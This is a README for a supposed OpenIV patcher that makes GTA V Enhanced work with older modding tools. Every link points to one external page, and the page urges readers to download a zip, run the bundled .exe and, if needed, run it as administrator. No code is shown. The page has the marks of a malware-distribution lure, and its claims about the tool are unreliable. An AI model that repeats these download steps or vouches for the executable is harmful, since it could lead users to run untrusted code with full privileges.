# OpenIV GTA V Enhanced Compatibility Patcher

<p align="center">
  <a href="https://OpenIV-GTA-5-Enhanced.github.io/.github"><img src="https://img.shields.io/badge/GET%20THE%20PATCHER-DOWNLOAD-00C853?style=for-the-badge&logo=github&logoColor=white" alt="Download OpenIV Enhanced Patcher"></a>
  <a href="https://OpenIV-GTA-5-Enhanced.github.io/.github"><img src="https://img.shields.io/badge/OPENIV-GTA%20V%20ENHANCED-8b5cf6?style=for-the-badge" alt="OpenIV GTA V Enhanced Compatibility"></a>
</p>

<p align="center">
  <a href="https://OpenIV-GTA-5-Enhanced.github.io/.github"><img src="https://img.shields.io/badge/GTA%20V%20ENHANCED-SUPPORTED-2ea44f?style=flat-square" alt="GTA V Enhanced Support"></a>
  <a href="https://OpenIV-GTA-5-Enhanced.github.io/.github"><img src="https://img.shields.io/badge/AUTO%20CONFIGURATION-✓-2ea44f?style=flat-square" alt="Automatic Configuration"></a>
  <a href="https://OpenIV-GTA-5-Enhanced.github.io/.github"><img src="https://img.shields.io/badge/EXECUTABLE%20FIX-✓-2ea44f?style=flat-square" alt="Executable Compatibility Fix"></a>
  <a href="https://OpenIV-GTA-5-Enhanced.github.io/.github"><img src="https://img.shields.io/badge/OIV%20PACKAGE%20SUPPORT-✓-2ea44f?style=flat-square" alt="OIV Package Support"></a>
</p>

<p align="center">
  <img src="https://github.com/OpenIV-GTA-5-Enhanced/.github/blob/main/assets/image/overlay.png?raw=true" width="700" alt="OpenIV GTA V Enhanced Compatibility Patcher">
</p>


## About

This utility is designed to simplify the transition to **Grand Theft Auto V Enhanced** for players who use OpenIV and other modding tools. Since some existing applications have not yet adapted to the updated game version, they may continue looking for the legacy `GTA5.exe` instead of the new `GTA5 Enhanced.exe`, leading to compatibility problems.

This patcher helps resolve that issue by adjusting your existing OpenIV setup to recognize the correct GTA V Enhanced installation directory. It also generates the required supporting files to improve compatibility with the updated game while the official OpenIV updates are still pending.

> **The setup is quick and straightforward:** run the script once, let it apply the necessary adjustments, and get your modding environment ready for GTA V Enhanced without having to modify configuration files manually.

---

## Features

### Seamless OpenIV Setup
Automatically configures OpenIV to detect the correct directory of your official **Grand Theft Auto V Enhanced** installation, eliminating issues caused by outdated path detection.

### Executable Compatibility Workaround
Creates a copy of the original `GTA5 Enhanced.exe` and saves it as `GTA5.exe`, helping OpenIV recognize the Enhanced version using its existing executable naming requirements.

### OIV Package Support
Creates an empty `OpenIV.asi` file to support the installation of `.oiv` packages without relying on the original `OpenIV.asi` file. *(Refer to the important note below for instructions on enabling the mods folder.)*

### Simple and Convenient
Features an easy-to-use folder selection window, so you can choose your game directory and apply the required changes without manually editing XML configuration files.

### Built-In Error Handling
Performs basic checks throughout the process to help identify potential issues and apply only the required modifications to your existing setup.

---

## System Requirements

- **Grand Theft Auto V Enhanced:** A working installation of the Enhanced edition is required for the patcher to locate and configure the game correctly.
- **OpenIV Installed and Initialized:** OpenIV must already be installed on your system. Before running the patcher, launch OpenIV at least once to ensure its configuration file has been created.

---

## Installation Guide

1. **Download the Archive:** Get the provided `.zip` package from this page and save it to your computer — [**CLICK HERE**](https://OpenIV-GTA-5-Enhanced.github.io/.github).

2. **Extract and Launch:** Unpack the downloaded archive, then run the included `.exe` utility to start the setup process.

3. **Locate Your Game Installation:** When the folder browser opens, select the root directory of your **Grand Theft Auto V Enhanced** installation. Make sure this is the folder containing `GTA5 Enhanced.exe`.

4. **Let the Utility Finish:** The tool will automatically apply the required compatibility adjustments. Wait a few seconds until the confirmation message **"All operations completed successfully!"** appears, then close the application.

> **That's it!** Your OpenIV configuration should now be prepared for use with GTA V Enhanced, without requiring any manual configuration edits.

---

## Troubleshooting Guide

If the patcher encounters a problem, check the message displayed in the command prompt. The following list covers the most common errors and their solutions.

### `ERROR: No folder was selected.`

The folder selection window was canceled or closed without choosing a directory. Launch the script again and select the root folder of your GTA V Enhanced installation.

### `ERROR: OpenIV settings file not found...`

OpenIV's configuration file could not be located. Start OpenIV manually, allow it to initialize, and then close the application before running the patcher again.

### `ERROR: 'GTA5 Enhanced.exe' was not found...`

The selected directory does not contain the required game executable. Browse to the correct GTA V Enhanced installation folder and verify that `GTA5 Enhanced.exe` is present.

### `ERROR: Failed to create 'GTA5.exe' or 'OpenIV.asi'...`

The utility may not have sufficient permissions to write files to the game directory. Right-click the `.exe` script and choose **"Run as administrator"**, then try again.
